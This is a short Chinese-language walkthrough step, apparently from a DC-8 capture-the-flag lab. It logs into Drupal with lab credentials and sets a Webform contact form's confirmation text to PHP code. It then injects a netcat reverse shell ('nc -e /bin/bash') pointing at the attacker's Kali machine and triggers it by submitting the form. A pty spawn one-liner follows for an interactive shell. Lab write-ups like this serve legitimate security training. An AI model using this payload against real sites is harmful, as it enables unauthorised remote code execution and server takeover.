1. 浏览器已登录 john/turtle：`http://192.168.186.129/user`
    
2. 顶部菜单 **Structure → Webforms** → 列表里找到 **Contact Us**（就是首页那个联系表单）
    
3. 进入它的 **Form settings**（表单设置）页
    
4. 找到确认信息/反馈相关的文本字段，**Text format 下拉选 PHP code**（webform 的字段和正文编辑器不同，这个格式选项对它默认是开的，不需要启用 PHP Filter 模块）
    
5. 写入反弹代码。
```
<?php system("nc -e /bin/bash 'kali ip' 4444"); ?>
```
	- `nc -e /bin/bash IP 端口`：netcat 的 **`-e` 参数**是"连接建立后，把指定程序（/bin/bash）的输入输出挂到网络连接上"。比 `bash -i >& /dev/tcp/...` 更直白：nc 一连上你的 Kali，对面就获得一个 bash
    -`192.168.186.x`：**换成你 Kali 的 IP**（用 `ip a` 查）
    -注意：`-e` 不是每个 nc 版本都有（openbsd-netcat 删了它），但 DC-8 自带的是 traditional nc，支持，博客里实测可用
    -保存后，访问首页的 **Contact Us** 页面，随便填点内容**提交表单**
    **触发时机**：表单提交 → Webform 显示"确认信息" → 渲染你的 PHP → 代码执行。所以 Kali 要先 `nc -lvnp 4444` 等着，再提交表单

**获取交互式shell**
```
python3 -c "import pty;pty.spawn('/bin/bash');"
```
